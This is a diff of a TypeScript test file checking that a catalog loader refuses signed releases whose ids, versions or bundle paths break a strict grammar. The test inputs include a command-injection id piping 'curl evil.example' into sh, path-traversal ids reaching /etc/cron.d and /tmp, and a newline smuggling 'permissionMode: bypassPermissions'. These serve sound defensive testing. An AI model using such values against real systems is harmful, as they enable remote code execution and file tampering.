@@ -1,72 +1,84 @@
 import assert from "node:assert/strict";
 import { test } from "node:test";
-import { isBundlePath, isID, isVersion } from "../src/catalog/grammar.ts";
+import { isBundlePath, isID, isVersion, shortName } from "../src/catalog/grammar.ts";
 import { localPath } from "../src/catalog/feed.ts";
+import { employeeOf } from "../src/catalog/release.ts";
 import { cleanPath, fields, trimSpace } from "../src/gotext.ts";
-import { bytes, Kit } from "./kit/kit.ts";
+import { bytes, HOST, Kit } from "./kit/kit.ts";
 import { load, refusal, sample, tempDir } from "./kit/sample.ts";
 
-test("an id is <publisher>/<name>, a version is three numbers", () => {
-  for (const ok of ["harnsy/accountant", "octo/sample-guest", "a/b", "0a/9-", "harnsy/" + "x".repeat(64)]) assert.ok(isID(ok), ok);
-  for (const bad of ["", "noslash", "harnsy/", "/x", "harnsy//etc/cron.d/x", "harnsy/../../../../tmp/x", "harnsy/a\nb", "Harnsy/x",
-    "harnsy/-x", "harnsy/x y", "harnsy/x; curl evil.example | sh #", "harnsy/x/y", "harnsy/" + "x".repeat(65), "harnsy/x\n"]) {
-    assert.equal(isID(bad), false, JSON.stringify(bad));
+const long = "a".repeat(65);
+
+/**
+ * Signs a release of one employee under the given id and version, with extra files in its bundle, and loads it. The
+ * bundle's url is a plain one: only the names under test are odd.
+ */
+function loadNamed(id: string, version: string, ...extra: string[]) {
+  const k = new Kit(), dir = tempDir(), src = sample("reviewer");
+  for (const name of extra) src.set(name, bytes("x\n"));
+  const p = k.pack(id, version, src, undefined, "packs/one.harnsy");
+  p.entry.cv_url = `https://${HOST}/e/one`;
+  k.release(dir, [p]);
+  return load(k, dir);
+}
+
+// A signed feed is not a checked one. An id becomes a folder on a person's disk and a word of a command; a release
+// that names anything outside the publisher's grammar is refused.
+test("a signed release with an id outside the grammar is refused", async () => {
+  for (const id of ["noslash", "harnsy//etc/cron.d/x", "harnsy/../../../../tmp/x", "harnsy/x\npermissionMode: bypassPermissions",
+    "harnsy/x; curl evil.example | sh #", "harnsy/--force", "harnsy/x/y", "Harnsy/x", "harnsy/X", "harnsy/-x", "/x", "harnsy/",
+    "harnsy/x ", "harnsy/x.y", `harnsy/${long}`, `${long}/x`]) {
+    const msg = await refusal(loadNamed(id, "1.0.0"));
+    assert.match(msg, /^id ".*: want <publisher>\/<name> in lowercase latin letters, digits and -$/, JSON.stringify(id));
+    assert.ok(!msg.includes("\n") && msg.length < 250, "a refusal stays one short line whatever the name holds");
+  }
+});
+
+test("a signed release with a version outside the grammar is refused", async () => {
+  for (const version of ["1.0", "01.0.0", "1.0.0-rc1", "v1.0.0", "1.0.0\n", "1.0.0/../x", ""]) {
+    assert.match(await refusal(loadNamed("harnsy/reviewer", version)), /^harnsy\/reviewer: version ".*: want MAJOR\.MINOR\.PATCH$/, JSON.stringify(version));
+  }
+});
+
+test("a signed bundle that lists a file outside the grammar is refused", async () => {
+  for (const file of ["README.md", "docs/other.md", "docs/persona-casebook.md.bak", "avatar.gif", "avatar.png/x", "bundle.json.d/x",
+    "skills/SKILL.md", "skills/Race/SKILL.md", "skills/race_hunt/SKILL.md", `skills/${long}/SKILL.md`,
+    "skills/race-hunt/README.md", "skills/race-hunt/hooks/run.sh", "skills/race-hunt/Scripts/run.sh",
+    "skills/race-hunt/scripts/a/b.sh", "skills/race-hunt/scripts/.hidden", "skills/race-hunt/scripts/run.",
+    "skills/race-hunt/scripts/run it.sh", "skills/race-hunt/scripts/nul.txt", "skills/race-hunt/assets/COM1",
+    "skills/race-hunt/references/skill.md", `skills/race-hunt/scripts/${long}`,
+    "SOUL.md", "AGENTS.md", "MEMORY.md", ".harnsy/hire.json"]) {
+    assert.match(await refusal(loadNamed("harnsy/reviewer", "1.0.0", file)), /is not a file a bundle carries$/, file);
+  }
+});
+
+test("the longest names and every shape of file the publisher packs are taken", async () => {
+  const part = "0" + "a-".repeat(31) + "z"; // 64 characters
+  const rel = await loadNamed(`${part}/${part}`, "0.10.123", "avatar.png", "avatar.jpg", "avatar.jpeg", "avatar.webp",
+    `skills/${"s".repeat(40)}/SKILL.md`, "skills/-/LICENSE", "skills/race-hunt/LICENSE", "skills/race-hunt/scripts/Run_it-2.sh",
+    "skills/race-hunt/references/guide.v2.md", `skills/race-hunt/assets/${"f".repeat(64)}`, "skills/race-hunt/scripts/console.txt");
+  assert.equal(employeeOf(rel, `${part}/${part}`)!.files.size, 14);
+  for (const [id, want] of [["harnsy/accountant", true], ["a/b", true], ["harnsy", false], ["harnsy/a/b", false], ["harnsy/a\n", false], ["", false]] as const) {
+    assert.equal(isID(id), want, JSON.stringify(id));
   }
   for (const ok of ["1.0.0", "0.0.0", "10.20.30"]) assert.ok(isVersion(ok), ok);
-  for (const bad of ["", "1.0", "1.0.0.0", "01.0.0", "1.0.0-rc1", "v1.0.0", "1.0.0\n", "1.0.x", "../1.0.0"]) {
-    assert.equal(isVersion(bad), false, JSON.stringify(bad));
-  }
-});
-
-test("a manifest may list only the files the publisher packs", () => {
-  for (const ok of ["bundle.json", "docs/persona-casebook.md", "avatar.png", "avatar.jpeg", "avatar.jpg", "avatar.webp",
-    "skills/month-end-close/SKILL.md", "skills/a/LICENSE", "skills/a/scripts/run.py", "skills/a/references/states.md",
-    "skills/a/assets/sheet.txt", "skills/a/scripts/a.b_c-d"]) {
-    assert.ok(isBundlePath(ok), ok);
-  }
-  for (const bad of ["", "manifest.json", "signatures/catalog.jws", "README.md", "docs/other.md", "docs/../bundle.json", "avatar.svg",
-    "avatar.png/x", "skills", "skills/a", "skills/a/", "skills/a/README.md", "skills/a/skill.md", "skills/A/SKILL.md",
-    "skills/a_b/SKILL.md", "skills/" + "a".repeat(41) + "/SKILL.md", "skills/a/hooks/run.sh", "skills/a/scripts/", "skills/a/scripts/x/y",
-    "skills/a/scripts/.hidden", "skills/a/scripts/end.", "skills/a/scripts/CON.txt", "skills/a/scripts/nul", "skills/a/scripts/a b",
-    "skills/a/scripts/" + "a".repeat(65), "skills/../x/SKILL.md", "skills/a/Scripts/x", "/bundle.json", "skills/a/SKILL.md\n",
-    "AGENTS.md", "SOUL.md", ".harnsy/hire.json", "MEMORY.md"]) {
+  for (const ok of ["bundle.json", "docs/persona-casebook.md", "skills/a/SKILL.md", "skills/a/LICENSE", "skills/a/assets/sheet.txt"]) assert.ok(isBundlePath(ok), ok);
+  for (const bad of ["", "manifest.json", "signatures/catalog.jws", "skills", "skills/a", "skills/a/", "skills/a/scripts/", "/bundle.json",
+    "skills/a/SKILL.md\n", "skills/../x/SKILL.md", "docs/../bundle.json"]) {
     assert.equal(isBundlePath(bad), false, JSON.stringify(bad));
   }
+  assert.deepEqual([shortName("harnsy/accountant"), shortName("noslash"), shortName("a/b/c")], ["accountant", "", "b/c"]);
 });
 
-// Ids and versions a signed release might carry after a fault of the publisher. The bundle and the feed are signed and
-// agree with each other: only this check stands between such a name and a path or a command on the person's machine.
-const names: [id: string, version: string, want: string][] = [
-  ["noslash", "1.0.0", "is not <publisher>/<name>"],
-  ["harnsy//etc/cron.d/x", "1.0.0", "is not <publisher>/<name>"],
-  ["harnsy/../../../../tmp/x", "1.0.0", "is not <publisher>/<name>"],
-  ["harnsy/x\npermissionMode: bypassPermissions", "1.0.0", "is not <publisher>/<name>"],
-  ["harnsy/x; curl evil.example | sh #", "1.0.0", "is not <publisher>/<name>"],
-  ["harnsy/--force", "1.0.0", "is not <publisher>/<name>"],
-  ["harnsy/reviewer", "1.0", "is not MAJOR.MINOR.PATCH"],
-  ["harnsy/reviewer", "1.0.0/../../x", "is not MAJOR.MINOR.PATCH"],
-];
-for (const [id, version, want] of names) {
-  test(`refused: a signed release with the name ${JSON.stringify(id)}@${JSON.stringify(version)}`, async () => {
-    const k = new Kit(), dir = tempDir();
-    k.release(dir, [k.pack(id, version, sample("reviewer"), undefined, "packs/harnsy/reviewer/1.0.0.harnsy")]);
-    const msg = await refusal(load(k, dir));
-    assert.ok(msg.includes(want), `refused with «${msg}», want it to say «${want}»`);
-    assert.ok(!msg.includes("\n"), "a refusal stays one line whatever the name holds");
-  });
-}
-
-for (const path of ["README.md", "docs/notes.md", "skills/race-hunt/hooks/run.sh", "skills/Race/SKILL.md", "skills/race-hunt/scripts/.env",
-  "skills/race-hunt/scripts/aux.py", "SOUL.md", ".harnsy/hire.json"]) {
-  test(`refused: a signed bundle that lists ${path}`, async () => {
-    const k = new Kit(), dir = tempDir();
-    const src = sample("reviewer");
-    src.set(path, bytes("x"));
-    k.release(dir, [k.pack("harnsy/reviewer", "1.0.0", src)]);
-    const msg = await refusal(load(k, dir));
-    assert.ok(msg.includes("not a file a bundle may carry"), msg);
-  });
-}
+test("a name outside the grammar refuses the release even on a version that is revoked; another kind is not read at all", async () => {
+  const k = new Kit(), dir = tempDir();
+  const good = k.pack("harnsy/reviewer", "1.0.0", sample("reviewer"));
+  const odd = k.pack("harnsy/../x", "1.0.0", sample("reviewer"), undefined, "packs/odd.harnsy");
+  k.release(dir, [good, odd], (f) => { f.revoked = ["harnsy/../x@1.0.0"]; });
+  assert.match(await refusal(load(k, dir)), /^id "harnsy\/\.\.\/x": want <publisher>\/<name>/);
+  k.release(dir, [good, odd], (f) => { f.bundles[1].kind = "team"; });
+  assert.deepEqual((await load(k, dir)).employees.map((e) => e.entry.id), ["harnsy/reviewer"]);
+});
 
 test("a feed url is a clean path on the catalog's host", () => {
   assert.equal(localPath("https://hr.harnsy.dev/packs/harnsy/a/1.0.0.harnsy", "hr.harnsy.dev"), "packs/harnsy/a/1.0.0.harnsy");
